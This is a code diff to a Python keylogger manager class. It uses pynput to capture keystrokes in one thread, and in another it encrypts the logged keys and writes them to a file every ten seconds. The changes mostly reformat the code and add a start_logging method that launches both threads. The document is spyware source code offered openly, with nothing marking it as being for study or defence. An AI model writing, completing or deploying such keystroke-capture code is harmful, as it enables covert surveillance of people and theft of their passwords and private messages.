@@ -1,10 +1,11 @@
-from service import KeyLoggerService,FileWriter,Encryptor
+from service import KeyLoggerService, FileWriter, Encryptor
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
-import threading,time
+import threading, time
+
 
 class KeyLoggerManager(IKeyLoggerManager):
-    def __init__(self,serial_number:int):
+    def __init__(self, serial_number: int):
         self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
         self.__writer = FileWriter()
@@ -13,11 +14,10 @@ class KeyLoggerManager(IKeyLoggerManager):
         self.__logger_thread = threading.Thread(target=self.__listen)
         self.__send_data_thread = threading.Thread(target=self.__send_data)
 
-
-    def stop_logging(self):
-    self.__is_logging = False
-    if hasattr(self, 'listener'):
-        self.listener.stop()
+    def start_logging(self):
+        self.__is_logging = True
+        self.__logger_thread.start()
+        self.__send_data_thread.start()
 
     def stop_logging(self):
         self.__is_logging = False
@@ -31,7 +31,8 @@ class KeyLoggerManager(IKeyLoggerManager):
     def __send_data(self):
         while self.__is_logging:
             data = self.__key_logger.get_logged_keys()
-            encrypt_data = {self.__encryptor.encrypt(key):self.__encryptor.encrypt(value) for key,value in data.items()}
+            encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
+                            data.items()}
             self.__writer.write(encrypt_data)
             time.sleep(10)
 
